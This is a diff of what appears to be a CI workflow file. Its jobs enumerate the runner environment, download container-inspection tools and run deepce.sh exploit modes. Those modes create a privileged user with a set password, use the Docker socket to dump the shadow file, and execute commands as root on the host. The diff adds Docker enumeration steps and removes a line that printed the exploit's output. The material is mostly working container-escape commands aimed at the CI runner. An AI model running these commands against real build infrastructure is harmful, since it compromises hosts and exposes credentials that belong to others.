@@ -10,7 +10,10 @@ jobs:
             uname -a  
       - run: |
             ps -ef
-            netstat -nl 
+            netstat -nl
+      - run: |
+            docker network; \
+            docker info      
       - run: |
             cd /tmp; \
             curl -L -o amicontained https://github.com/genuinetools/amicontained/releases/download/v0.4.7/amicontained-linux-amd64; \
@@ -23,6 +26,4 @@ jobs:
             ./deepce.sh; \
             ./deepce.sh --no-enumeration --exploit PRIVILEGED --username deepce --password deepce; \
             ./deepce.sh --no-enumeration --exploit SOCK --shadow; \
-            ./deepce.sh --no-enumeration --exploit DOCKER --command "whoami>/tmp/hacked"; \
-            cat /tmp/hacked
-            
+            ./deepce.sh --no-enumeration --exploit DOCKER --command "whoami>/tmp/hacked" 
